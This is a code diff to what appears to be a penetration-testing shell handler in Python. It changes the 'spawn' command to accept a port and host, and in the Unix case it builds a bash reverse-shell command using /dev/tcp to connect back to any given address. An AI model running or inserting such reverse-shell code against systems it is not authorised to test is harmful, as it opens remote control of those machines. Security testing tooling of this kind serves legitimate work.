@@ -275,13 +275,31 @@ class MainMenu(cmd.Cmd):
 			for script in options.recon_scripts[core.sessions[ID].OS]:
 				core.sessions[ID].upload(script)
 
-	def do_spawn(self, ID):
-		"""Spawn a new session. Whether it will be reverse or bind, depends on the current session."""
-		if ID:=self.select(ID):
+	def do_spawn(self, line):
+		"""\
+		Spawn a new session. If the current shell is reverse, or a port or host is specified, then will spawn a reverse shell.
+		If the currert shell is bind, then will spawn a bind shell
+		"""
+		if self.sid:
+			host, port = None, None
+
+			if line:
+				args=line.split(" ")
+				port = args[0]
+				arg_num=len(args)
+				if arg_num == 2:
+					host = args[1]
+				elif arg_num > 2:
+					print()
+					logger.error("Invalid PORT - HOST combination")
+					self.onecmd("help spawn")
+					return False
 			#if core.sessions[ID].spawn():
 			#	return True
 			#threading.Thread(target=core.sessions[ID].spawn).start()
-			core.sessions[ID].spawn()
+			core.sessions[self.sid].spawn(port, host)
+		else:
+			cmdlogger.warning("No session ID selected. Select one with \"use [ID]\"")
 
 	def do_upgrade(self, ID):
 		"""\
@@ -1389,10 +1407,12 @@ class Session:
 		elif self.OS == 'Windows':
 			logger.warning("Upload on Windows shells is not implemented yet")
 
-	def spawn(self):
+	def spawn(self, port=None, host=None):
 		if self.OS == "Unix":
-			if self.listener:
-				host,port=self.socket.getsockname()
+			if any([self.listener, port, host]):
+				_host,_port=self.socket.getsockname()
+				if not port: port=_port
+				if not host: host=_host
 				logger.info(f"Attempting to spawn a reverse shell on {host}:{port}")
 				# bash -i doesn't always work
 				cmd=f'bash -c "/bin/bash >& /dev/tcp/{host}/{port} 0>&1 &"'
